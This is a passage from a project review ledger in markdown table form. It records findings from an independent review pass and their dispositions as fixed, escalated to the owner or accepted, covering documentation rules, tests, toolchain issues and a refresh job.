| M-5 | `docs/prd.md` REQ-CMP-004 still states the rule D-143 amended | **FIXED** (W-104). The M13 row is kept and marked superseded; an amended row states the shipped rule |
| M-6 | REQ-IMG-002/003 and REQ-DTL-001/002 dropped with no disposition; no detail screen exists | **ESCALATED to the owner** (W-105), owning milestone M15. The detail screen is the first ruling in the M15 plan, because taking the unit off the card assumed it |
| M-7 | Two more security-pass waivers never reached this ledger; D-141 unratified | **ESCALATED to the owner** (W-106). The count is now written down where C2b reads it: five |
| M-8 | The anchor-is-not-the-floor decision is defended by a numeric coincidence | **FIXED** (W-107). `test_the_served_anchor_does_not_follow_a_moved_floor`; the seat's mutant now dies |
| MINOR: `make lint` version-dependent, CI narrower, `make test` needs a gitignored artifact | **ESCALATED** (W-108), M15. Both touch `.github/` and the toolchain pin, the owner's surface |
| MINOR: `docs/research/` ungoverned | **FIXED** (W-109). Named in `.governed-records`; the seat's mutant now fails the gate |
| MINOR: all M14 records `status: draft` | **ACCEPTED as the project's convention** — every wave-close record since M9 is `draft` and is ratified by the owner's signing commit, not by its own frontmatter. Stated here rather than changed, so the convention is visible |
| MINOR: `note.txt` 81 lines against ≤30 | **FIXED** at this closure — rewritten to 30 lines, with the detail moved into the closure report |
| MINOR: D-146 body said "Decision (proposed)" under an accepted header | **FIXED** |
| MINOR: W-094's open half had no owning milestone | **FIXED** — M15 |
| MINOR: `make typecheck` is `src` only; `mypy src tests scripts` dies on a module-path collision | **ACCEPTED**, M15 with W-108: it is the same toolchain decision |
| MINOR: the plist rewrite deleted its own install/exit-code documentation | **FIXED** — both live in `scripts/refresh_job.sh` and `scripts/install_refresh_wrapper.sh`, which are the agent-writable side; `deploy/` stays the owner's |
| NIT: `GapEntry.id` folds truncated text; a tampered `count == Int.max` traps | **ACCEPTED**, reachable only by local file tampering; recorded here so the next reader meets them |
| NIT: a far-outlier row could print native Elo among /100 neighbours | **ACCEPTED** — unreachable on today's boards (widest live spread ~90 Elo against a 2000 bound), and the alternative is a card that prints a number nobody can defend |

**What the seat changed about this closure:** the milestone was ready to close on a privacy invariant
whose test could not fail, and with a repaired refresh job that no longer installed. Neither would have
been caught by any gate in the tree. That is the third time an independent seat at this project has
refuted a green.
